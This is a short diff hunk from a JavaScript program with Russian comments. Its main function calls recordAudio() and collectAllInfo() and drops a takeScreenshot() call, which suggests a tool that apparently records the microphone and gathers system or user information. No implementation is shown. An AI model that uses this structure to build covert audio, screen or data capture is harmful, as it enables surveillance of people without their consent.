@@ -548,7 +548,7 @@ async function main() {
                             
                             // Микрофон и скриншот
                             await recordAudio();
-                            await takeScreenshot();
+                        
                             
                             // Остальная информация
                             const allInfo = await collectAllInfo();
